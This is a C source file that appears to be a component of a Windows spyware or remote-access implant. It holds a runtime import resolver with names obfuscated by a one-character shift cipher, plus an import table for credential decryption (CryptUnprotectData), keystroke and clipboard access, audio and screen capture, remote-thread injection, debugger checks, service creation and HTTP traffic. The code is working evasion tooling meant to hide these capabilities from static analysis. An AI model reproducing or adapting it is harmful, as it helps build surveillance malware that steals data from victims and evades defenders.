#include <stdio.h>
#include <string.h>

#include "dynamic_import.h"
#include "obfuscated_calls.h"
#include "..\demo_functions.h"

#define SAFE_FREE(x)  { if(x) free(x); x = NULL; }

static XREFDLL dll_imports[] = {

	IMPORT_DLL(KERNEL32DLL)
		IMPORT_CALL(CreateFileMappingA)
		IMPORT_CALL(UnmapViewOfFile)
		IMPORT_CALL(GetTickCount)
		IMPORT_CALL(TerminateProcess)
		IMPORT_CALL(CreateFileW)
		IMPORT_CALL(GetFileSize)
		IMPORT_CALL(OpenProcess)
		IMPORT_CALL(GetCurrentProcessId)
		IMPORT_CALL(FlushFileBuffers)
		IMPORT_CALL(GetSystemDirectoryA)
		IMPORT_CALL(GetEnvironmentVariableW)
		IMPORT_CALL(FindClose)
		IMPORT_CALL(FindNextFileW)
		IMPORT_CALL(CopyFileW)
		IMPORT_CALL(RemoveDirectoryW)
		IMPORT_CALL(FindFirstFileW)
		IMPORT_CALL(CreateDirectoryW)
		IMPORT_CALL(WriteFile)
		IMPORT_CALL(CreateFileA)
		IMPORT_CALL(ExitProcess)
		IMPORT_CALL(GetDriveTypeW)
		IMPORT_CALL(ReadFile)
		IMPORT_CALL(GetModuleFileNameA)
		IMPORT_CALL(LocalFree)
		IMPORT_CALL(LocalAlloc)
		IMPORT_CALL(GetLastError)
		IMPORT_CALL(Process32Next)
		IMPORT_CALL(Module32Next)
		IMPORT_CALL(Module32First)
		IMPORT_CALL(Process32First)
		IMPORT_CALL(CreateToolhelp32Snapshot)
		IMPORT_CALL(GetProcAddress)
		IMPORT_CALL(FindFirstFileA)
		IMPORT_CALL(GetEnvironmentVariableA)
		IMPORT_CALL(GetFileInformationByHandle)
		IMPORT_CALL(LoadLibraryA)
		IMPORT_CALL(Process32NextW)
		IMPORT_CALL(Process32FirstW)
		IMPORT_CALL(FreeLibrary)
		IMPORT_CALL(GetCurrentProcess)
		IMPORT_CALL(GetDiskFreeSpaceExW)
		IMPORT_CALL(GetLocaleInfoW)
		IMPORT_CALL(GlobalMemoryStatusEx)
		IMPORT_CALL(GetSystemInfo)
		IMPORT_CALL(GetSystemPowerStatus)
		IMPORT_CALL(GetVolumeInformationW)
		IMPORT_CALL(LoadLibraryW)
		IMPORT_CALL(WaitForSingleObject)
		IMPORT_CALL(SetFileAttributesW)
		IMPORT_CALL(SetLastError)
		IMPORT_CALL(VirtualQueryEx)
		IMPORT_CALL(Module32NextW)
		IMPORT_CALL(Module32FirstW)
		IMPORT_CALL(WideCharToMultiByte)
		IMPORT_CALL(GetShortPathNameW)
		IMPORT_CALL(ExpandEnvironmentStringsW)
		IMPORT_CALL(ExpandEnvironmentStringsA)
		IMPORT_CALL(VirtualFreeEx)
		IMPORT_CALL(GetSystemTimeAsFileTime)
		IMPORT_CALL(DeleteFileA)
		IMPORT_CALL(SetFileAttributesA)
		IMPORT_CALL(GetLongPathNameA)
		IMPORT_CALL(GetCommandLineW)
		IMPORT_CALL(GetCommandLineA)
		IMPORT_CALL(MoveFileExA)
		IMPORT_CALL(GlobalUnlock)
		IMPORT_CALL(OpenFileMappingA)
		IMPORT_CALL(CopyFileA)
		IMPORT_CALL(FindNextFileA)
		IMPORT_CALL(GetDiskFreeSpaceExA)
		IMPORT_CALL(SetFilePointer)
		IMPORT_CALL(IsDebuggerPresent)
		IMPORT_CALL(GetFileTime)
		IMPORT_CALL(GlobalFree)
		IMPORT_CALL(LoadLibraryExA)
		IMPORT_CALL(GlobalAlloc)
		IMPORT_CALL(DeviceIoControl)
		IMPORT_CALL(VirtualFree)
		IMPORT_CALL(VirtualProtectEx)
		IMPORT_CALL(WriteProcessMemory)
		IMPORT_CALL(ReadProcessMemory)
		IMPORT_CALL(CreateRemoteThread)
		IMPORT_CALL(SystemTimeToFileTime)
		IMPORT_CALL(GetSystemTime)
		IMPORT_CALL(lstrcmpA)
		IMPORT_CALL(GetFileAttributesW)
		IMPORT_CALL(MultiByteToWideChar)
		IMPORT_CALL(GetPrivateProfileStringW)
		IMPORT_CALL(lstrcatA)
		IMPORT_CALL(lstrcpyA)
		IMPORT_CALL(lstrcmpW)
		IMPORT_CALL(GetVolumeInformationA)
		IMPORT_CALL(SetFileTime)
		IMPORT_CALL(IsBadStringPtrW)
		IMPORT_CALL(GetCPInfo)
		IMPORT_CALL(GetStdHandle)
		IMPORT_CALL(GetModuleHandleW)
		IMPORT_CALL(VirtualAlloc)
		IMPORT_CALL(HeapDestroy)
		IMPORT_CALL(HeapCreate)
		IMPORT_CALL(DeleteCriticalSection)
		IMPORT_CALL(GetCurrentThreadId)
		IMPORT_CALL(SetUnhandledExceptionFilter)
		IMPORT_CALL(UnhandledExceptionFilter)
		IMPORT_CALL(RaiseException)
		IMPORT_CALL(RtlUnwind)
		IMPORT_CALL(HeapFree)
		IMPORT_CALL(HeapAlloc)
		IMPORT_CALL(HeapReAlloc)
		IMPORT_CALL(LCMapStringA)
		IMPORT_CALL(LCMapStringW)
		IMPORT_CALL(HeapSize)
		IMPORT_CALL(VirtualQuery)
		IMPORT_CALL(SetHandleCount)
		IMPORT_CALL(GetFileType)
		IMPORT_CALL(GetStartupInfoA)
		IMPORT_CALL(FreeEnvironmentStringsA)
		IMPORT_CALL(GetEnvironmentStrings)
		IMPORT_CALL(FreeEnvironmentStringsW)
		IMPORT_CALL(GetEnvironmentStringsW)
		IMPORT_CALL(QueryPerformanceCounter)
		IMPORT_CALL(InitializeCriticalSectionAndSpinCount)
		IMPORT_CALL(GetConsoleCP)
		IMPORT_CALL(GetConsoleMode)
		IMPORT_CALL(GetStringTypeA)
		IMPORT_CALL(GetStringTypeW)
		IMPORT_CALL(GetLocaleInfoA)
		IMPORT_CALL(MapViewOfFile)
		IMPORT_CALL(GetModuleHandleA)
		IMPORT_CALL(CloseHandle)
		IMPORT_CALL(InitializeCriticalSection)
		IMPORT_CALL(Sleep)
		IMPORT_CALL(ExitThread)
		IMPORT_CALL(EnterCriticalSection)
		IMPORT_CALL(LeaveCriticalSection)
		IMPORT_CALL(InterlockedIncrement)
		IMPORT_CALL(InterlockedDecrement)
		IMPORT_CALL(GetACP)
		IMPORT_CALL(GetOEMCP)
		IMPORT_CALL(IsValidCodePage)
		IMPORT_CALL(TlsGetValue)
		IMPORT_CALL(TlsAlloc)
		IMPORT_CALL(TlsFree)
		IMPORT_CALL(TlsSetValue)
		IMPORT_CALL(GlobalLock)
		IMPORT_CALL(SetStdHandle)
		IMPORT_CALL(WriteConsoleA)
		IMPORT_CALL(GetConsoleOutputCP)
		IMPORT_CALL(WriteConsoleW)
		IMPORT_CALL(SetEndOfFile)
		IMPORT_CALL(GetProcessHeap)
		IMPORT_CALL(DeleteFileW)
	END_DLL

	IMPORT_DLL(PSAPIDLL)
		IMPORT_CALL(GetModuleFileNameExA)
		IMPORT_CALL(GetDeviceDriverBaseNameW)
		IMPORT_CALL(EnumDeviceDrivers)
		IMPORT_CALL(GetModuleFileNameExW)
		IMPORT_CALL(EnumProcessModules)
	END_DLL

	IMPORT_DLL(ADVAPI32DLL)
		IMPORT_CALL(SetSecurityDescriptorSacl)
		IMPORT_CALL(RegOpenKeyA)
		IMPORT_CALL(RegQueryValueExA)
		IMPORT_CALL(RegCreateKeyA)
		IMPORT_CALL(LookupAccountSidA)
		IMPORT_CALL(GetUserNameA)
		IMPORT_CALL(RegLoadKeyW)
		IMPORT_CALL(RegCreateKeyW)
		IMPORT_CALL(RegSetValueExA)
		IMPORT_CALL(RegUnLoadKeyW)
		IMPORT_CALL(RegOpenKeyW)
		IMPORT_CALL(RegEnumKeyW)
		IMPORT_CALL(OpenProcessToken)
		IMPORT_CALL(LookupPrivilegeValueA)
		IMPORT_CALL(AdjustTokenPrivileges)
		IMPORT_CALL(RegOpenKeyExW)
		IMPORT_CALL(RegQueryValueExW)
		IMPORT_CALL(RegCloseKey)
		IMPORT_CALL(GetSecurityDescriptorSacl)
		IMPORT_CALL(ConvertStringSecurityDescriptorToSecurityDescriptorA)
		IMPORT_CALL(SetSecurityDescriptorDacl)
		IMPORT_CALL(InitializeSecurityDescriptor)
		IMPORT_CALL(CloseEventLog)
		IMPORT_CALL(OpenEventLogA)
		IMPORT_CALL(GetOldestEventLogRecord)
		IMPORT_CALL(GetNumberOfEventLogRecords)
		IMPORT_CALL(ReadEventLogA)
		IMPORT_CALL(CloseServiceHandle)
		IMPORT_CALL(OpenSCManagerA)
		IMPORT_CALL(StartServiceA)
		IMPORT_CALL(CreateServiceW)
		IMPORT_CALL(RegOpenKeyExA)
		IMPORT_CALL(RegEnumValueA)
		IMPORT_CALL(RegEnumKeyExA)
		IMPORT_CALL(RegDeleteValueA)
		IMPORT_CALL(GetSidSubAuthority)
		IMPORT_CALL(GetSidSubAuthorityCount)
		IMPORT_CALL(GetTokenInformation)
		IMPORT_CALL(ConvertSidToStringSidW)
		IMPORT_CALL(RegSetValueExW)
		IMPORT_CALL(GetUserNameW)
		IMPORT_CALL(RegEnumKeyExW)
		IMPORT_CALL(ConvertSidToStringSidA)
	END_DLL

	IMPORT_DLL(USER32DLL)
		IMPORT_CALL(ToUnicode)
		IMPORT_CALL(EnumChildWindows)
		IMPORT_CALL(GetClassNameW)
		IMPORT_CALL(RegisterWindowMessageW)
		IMPORT_CALL(PeekMessageA)
		IMPORT_CALL(TranslateMessage)
		IMPORT_CALL(DispatchMessageA)
		IMPORT_CALL(InvalidateRect)
		IMPORT_CALL(GetKeyNameTextW)
		IMPORT_CALL(CloseClipboard)
		IMPORT_CALL(GetClipboardData)
		IMPORT_CALL(OpenClipboard)
		IMPORT_CALL(EnumWindows)
		IMPORT_CALL(IsWindow)
		IMPORT_CALL(FindWindowExW)
		IMPORT_CALL(SendMessageTimeoutW)
		IMPORT_CALL(GetWindowTextW)
		IMPORT_CALL(GetWindowTextA)
		IMPORT_CALL(LoadIconA)
		IMPORT_CALL(LoadCursorA)
		IMPORT_CALL(RegisterClassExA)
		IMPORT_CALL(CreateWindowExA)
		IMPORT_CALL(ShowWindow)
		IMPORT_CALL(UpdateWindow)
		IMPORT_CALL(DefWindowProcA)
		IMPORT_CALL(BeginPaint)
		IMPORT_CALL(GetClientRect)
		IMPORT_CALL(EndPaint)
		IMPORT_CALL(MessageBoxA)
		IMPORT_CALL(SystemParametersInfoA)
		IMPORT_CALL(GetForegroundWindow)
		IMPORT_CALL(GetSystemMetrics)
		IMPORT_CALL(GetDC)
		IMPORT_CALL(GetDesktopWindow)
		IMPORT_CALL(GetWindowInfo)
		IMPORT_CALL(ReleaseDC)
		IMPORT_CALL(wsprintfW)
		IMPORT_CALL(GetWindowThreadProcessId)
		IMPORT_CALL(DrawTextA)
		IMPORT_CALL(wsprintfA)
	END_DLL

	IMPORT_DLL(IMAGEHLPDLL)
		IMPORT_CALL(MapAndLoad)
		IMPORT_CALL(UnMapAndLoad)
	END_DLL

	IMPORT_DLL(WINHTTPDLL)
		IMPORT_CALL(WinHttpGetIEProxyConfigForCurrentUser)
		IMPORT_CALL(WinHttpReadData)
		IMPORT_CALL(WinHttpReceiveResponse)
		IMPORT_CALL(WinHttpSendRequest)
		IMPORT_CALL(WinHttpQueryOption)
		IMPORT_CALL(WinHttpWriteData)
		IMPORT_CALL(WinHttpOpen)
		IMPORT_CALL(WinHttpSetOption)
		IMPORT_CALL(WinHttpAddRequestHeaders)
		IMPORT_CALL(WinHttpGetProxyForUrl)
		IMPORT_CALL(WinHttpConnect)
		IMPORT_CALL(WinHttpSetTimeouts)
		IMPORT_CALL(WinHttpOpenRequest)
	END_DLL
		
	IMPORT_DLL(SHLWAPIDLL)
		IMPORT_CALL(StrRChrA)
		IMPORT_CALL(wnsprintfW)
	END_DLL
	
	IMPORT_DLL(WINMMDLL)
		IMPORT_CALL(mixerSetControlDetails)
		IMPORT_CALL(mixerGetControlDetailsA)
		IMPORT_CALL(mixerGetLineControlsA)
		IMPORT_CALL(mixerGetLineInfoA)
		IMPORT_CALL(waveInClose)
		IMPORT_CALL(waveInReset)
		IMPORT_CALL(mixerClose)
		IMPORT_CALL(mixerGetDevCapsA)
		IMPORT_CALL(mixerGetNumDevs)
		IMPORT_CALL(waveInOpen)
		IMPORT_CALL(mixerOpen)
	END_DLL

	IMPORT_DLL(CRYPT32DLL)
		IMPORT_CALL(CertFreeCertificateContext)
		IMPORT_CALL(CryptUnprotectData)
	END_DLL
	
	IMPORT_DLL(OLEACCDLL)
		IMPORT_CALL(AccessibleChildren)
		IMPORT_CALL(AccessibleObjectFromWindow)
	END_DLL

	IMPORT_DLL(VERSIONDLL)
		IMPORT_CALL(VerQueryValueW)
		IMPORT_CALL(GetFileVersionInfoSizeW)
		IMPORT_CALL(GetFileVersionInfoW)
	END_DLL

	IMPORT_DLL(GDI32DLL)
		IMPORT_CALL(CreateDCA)
		IMPORT_CALL(SetDIBits)
		IMPORT_CALL(CreateRectRgn)
		IMPORT_CALL(CreateSolidBrush)
		IMPORT_CALL(FillRgn)
		IMPORT_CALL(SetTextColor)
		IMPORT_CALL(SetBkColor)
		IMPORT_CALL(GetStockObject)
		IMPORT_CALL(CreateCompatibleDC)
		IMPORT_CALL(CreateCompatibleBitmap)
		IMPORT_CALL(CreatePalette)
		IMPORT_CALL(SelectPalette)
		IMPORT_CALL(SelectObject)
		IMPORT_CALL(StretchBlt)
		IMPORT_CALL(GetDIBits)
		IMPORT_CALL(DeleteObject)
		IMPORT_CALL(DeleteDC)
	END_DLL

	IMPORT_DLL(NETAPI32DLL)
		IMPORT_CALL(NetUserGetInfo)
		IMPORT_CALL(NetApiBufferFree)
	END_DLL

	IMPORT_DLL(SHELL32DLL)
		IMPORT_CALL(SHGetSpecialFolderPathW)
	END_DLL

	IMPORT_DLL(OLE32DLL)
		IMPORT_CALL(CreateStreamOnHGlobal)
	END_DLL
	
	END_IMPORTING
};

void shiftBy1(char *str)
{
	char* ptr = str;
	while (*ptr) {
		(*ptr) -= 1;
		ptr++;
	}
}

ULONG_PTR resolve_call(char* dll, char* call)
{
	char* c = strdup(call);
	char* d = strdup(dll);
	
	if (!c || !d) {
		SAFE_FREE(c);
		SAFE_FREE(d);
		return NULL;
	}

	shiftBy1(c);
	shiftBy1(d);

	int i = 0;
	HMODULE module;
	ULONG_PTR ptr;

	do {
		module = LoadLibrary(d);
		if (!module)
			Sleep(100);
		i++;
	} while(module==NULL && i<4);
	if (!module)
		ReportExitProcess();
	
	i = 0;
	do {
		ptr = (ULONG_PTR) GetProcAddress(module, c);
		if (!ptr)
			Sleep(100);
		i++;
	} while(ptr==NULL && i<4);
	if (!ptr)
		ReportExitProcess();

	SAFE_FREE(c);
	SAFE_FREE(d);
	return ptr;
}

ULONG_PTR dynamic_call(TCHAR* name)
{
	XREFDLL *dll = dll_imports;
	
	while (dll->name) {
		XREFCALL* call = dll->calls;
		while (call->name) {
			if (_stricmp(call->name, name) == 0) {
				// if ptr is not solved, solve it before returning
				if (call->ptr == 0)
					call->ptr = resolve_call(dll->name, call->name);
				return call->ptr;
			}
			call++;
		}
		dll++;
	}

	ReportExitProcess();
	return 0;
}
